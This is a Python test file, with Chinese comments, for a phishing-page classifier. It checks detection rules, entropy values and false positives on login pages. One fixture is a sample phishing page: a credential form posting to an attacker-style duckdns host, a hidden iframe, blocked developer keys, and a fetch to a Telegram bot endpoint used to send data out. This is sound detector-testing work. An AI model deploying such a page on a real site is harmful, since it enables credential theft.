"""
test_node3_phishing.py — Node 3 判定邏輯自檢
執行: python test_node3_phishing.py
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nodes.node3_phishing_classifier import (
    classify_phishing_node, _analyze_html_structure, _shannon_entropy,
    PHISHING_CONFIDENCE_THRESHOLD, DECISIVE_CONFIDENCE,
)


class _FakeLLM:
    """離線 LLM：回固定 0.0，確保測的是規則層而非 LLM"""
    def invoke(self, prompt):
        return '{"is_phishing": false, "confidence": 0.0, "key_indicators": []}'


def _state(url, html, js=""):
    return {
        "url": url, "raw_html": html,
        "js_scripts": [],
        "deobfuscated_js": [{"deobfuscated": js, "obfuscation_score": 0.0}],
        "is_phishing": False, "phishing_confidence": 0.0, "phishing_indicators": [],
        "errors": [],
    }


PHISH_HTML = """
<html><body oncontextmenu="return false;">
<form action="https://evil-collector.duckdns.org/login.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<img src="https://www.paypal.com/images/logo.png">
<iframe src="https://tracker.example-evil.tld/x" style="display:none;visibility:hidden"></iframe>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""

LEGIT_HTML = """
<html><body>
<form action="/session" method="post">
  <input type="email" name="email" required>
  <input type="password" name="password" required minlength="8">
</form>
<img src="/static/logo.png">
<script src="https://www.googletagmanager.com/gtm.js?id=GTM-XXXX"></script>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXX"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>
navigator.sendBeacon('/analytics');
document.querySelector('[type="password"]');
</script></body></html>
"""


def test_phishing_detected():
    """Layer 1 應該直接裁決，不需要跨過任何閾值"""
    s = classify_phishing_node(_state("https://secure-login.duckdns.org/verify", PHISH_HTML),
                               _FakeLLM())
    assert s["is_phishing"], f"釣魚頁未被判定: {s['phishing_confidence']}"
    assert s["phishing_confidence"] == DECISIVE_CONFIDENCE, "應由 Layer 1 裁決"
    joined = " ".join(s["phishing_indicators"])
    assert "[D1]" in joined, f"webhook 決定性規則未觸發: {joined}"
    assert "[D3]" in joined, f"表單送往免費主機規則未觸發: {joined}"


def test_sso_form_not_flagged():
    """憑證表單 POST 到真實 IdP 是合法 SSO，不得觸發 D3/跨網域"""
    _, inds, flags = _analyze_html_structure(
        '<form action="https://login.microsoftonline.com/common/oauth2/authorize">'
        '<input type="email" name="u" required>'
        '<input type="password" name="p" required></form>',
        "https://portal.contoso.com/signin",
    )
    assert "form_action_cross_domain" not in flags, inds
    assert "form_action_free_host" not in flags, inds


def test_shannon_entropy_matches_dataset():
    """與 Dataset.csv 的 entropy 欄位定義一致（rmit 樣本: 3.709147917）"""
    e = _shannon_entropy("https://www.rmit.edu.au/")
    assert abs(e - 3.709147917) < 1e-6, e


def test_legit_not_flagged():
    s = classify_phishing_node(_state("https://app.mycompany.com/login", LEGIT_HTML),
                               _FakeLLM())
    assert not s["is_phishing"], f"合法登入頁誤報: {s['phishing_confidence']}"
    joined = " ".join(s["phishing_indicators"])
    assert "hidden_iframe" not in joined, "GTM noscript iframe 誤判為隱藏 iframe"
    assert "brand_asset_hotlink" not in joined, "同域資源誤判為盜連"


def test_form_action_to_ip():
    _, inds, flags = _analyze_html_structure(
        '<form action="http://185.23.44.7/post.php">'
        '<input type="password" name="pwd"></form>',
        "https://bank-verify.example/login",
    )
    assert {"cred_form", "form_action_to_ip"} <= flags, inds


def test_lexical_alone_cannot_decide():
    """不變式：URL 詞彙特徵（WoE 校準那批）全部命中，也不足以單獨判定。

    資料集的正常樣本是舊爬取的短首頁，現代電商 URL 又長又高熵，
    實測 WoE 高估了這些特徵 —— 所以它們只能當佐證。
    """
    from nodes.node3_phishing_classifier import _analyze_url_lexical
    long_url = ("https://shop.example.com/catalog/products/2026/summer-collection"
                "/womens/shoes/running?utm_source=newsletter&utm_campaign=q3&page=2")
    assert len(long_url) > 120
    score, inds, flags = _analyze_url_lexical(long_url)
    assert score < PHISHING_CONFIDENCE_THRESHOLD, f"詞彙層單獨越過閾值: {score} {inds}"
    s = classify_phishing_node(_state(long_url, LEGIT_HTML), _FakeLLM())
    assert not s["is_phishing"], f"長 URL 正常頁誤報: {s['phishing_confidence']}"


if __name__ == "__main__":
    for fn in (test_phishing_detected, test_legit_not_flagged,
               test_form_action_to_ip,
               test_sso_form_not_flagged, test_shannon_entropy_matches_dataset,
               test_lexical_alone_cannot_decide):
        fn()
        print(f"PASS  {fn.__name__}")
    print(f"\nLayer2 閾值 = {PHISHING_CONFIDENCE_THRESHOLD} / "
          f"Layer1 信心度 = {DECISIVE_CONFIDENCE}")
